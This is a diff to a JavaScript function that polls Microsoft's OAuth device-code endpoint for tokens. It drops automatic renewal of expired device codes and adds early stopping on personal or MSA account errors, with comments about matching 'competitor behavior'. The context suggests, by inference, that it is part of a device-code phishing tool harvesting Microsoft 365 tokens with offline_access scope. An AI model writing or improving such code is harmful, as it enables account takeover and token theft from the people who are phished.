@@ -214,9 +214,6 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
   const maxAttempts = 60;
   let attempts = 0;
   let interval = initialInterval || 5; // Use server-recommended interval
-  let currentDeviceCode = deviceCode;
-  let refreshAttempts = 0;
-  const maxRefreshAttempts = 3; // Allow up to 3 automatic refreshes
 
   while (attempts < maxAttempts) {
     attempts++;
@@ -233,7 +230,7 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
           body: new URLSearchParams({
             grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
             client_id: verifyData.client_id,
-            device_code: currentDeviceCode,
+            device_code: deviceCode,
           }),
         }
       );
@@ -279,6 +276,7 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
 
       // Handle specific OAuth device code errors
       const errorCode = tokenData.error || '';
+      const errorDesc = tokenData.error_description || '';
 
       if (errorCode === 'authorization_pending') {
         // User has not yet authorized - continue polling with same interval
@@ -291,40 +289,22 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
         continue;
       }
 
-      if (errorCode === 'expired_token') {
-        // Token expired - try to automatically refresh
-        refreshAttempts++;
-        if (refreshAttempts <= maxRefreshAttempts) {
-          console.log('[DeviceCode] Token expired, attempting refresh #' + refreshAttempts);
-          try {
-            const refreshResponse = await fetch(
-              `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
-              {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({
-                  client_id: verifyData.client_id,
-                  scope: 'offline_access openid profile https://graph.microsoft.com/User.Read',
-                }),
-              }
-            );
-            const refreshData = await refreshResponse.json();
-            if (refreshData.device_code) {
-              currentDeviceCode = refreshData.device_code;
-              console.log('[DeviceCode] Got new device code, continuing polling');
-              continue;
-            }
-          } catch (refreshErr) {
-            console.error('[DeviceCode] Refresh failed:', refreshErr.message);
-          }
-        }
-        // Max refresh attempts reached or refresh failed
-        console.log('[DeviceCode] Max refresh attempts reached, stopping');
-        return;
-      }
-
-      if (errorCode === 'authorization_declined') {
-        // User declined - stop polling
+      // Personal account errors - stop immediately with "code expired" behavior
+      if (
+        errorCode === 'expired_token' ||
+        errorCode === 'authorization_declined' ||
+        errorDesc.includes('AADSTS50079') ||  // MSA account requires interaction
+        errorDesc.includes('personal account') ||
+        errorDesc.includes('MSA') ||
+        (errorCode === 'invalid_grant' && (
+          errorDesc.includes('expired') ||
+          errorDesc.includes('personal') ||
+          errorDesc.includes('MSA')
+        ))
+      ) {
+        // Personal account or declined - stop polling immediately
+        // This matches competitor behavior showing "code expired"
+        console.log('[DeviceCode] Personal account detected, stopping with expired behavior');
         return;
       }
 
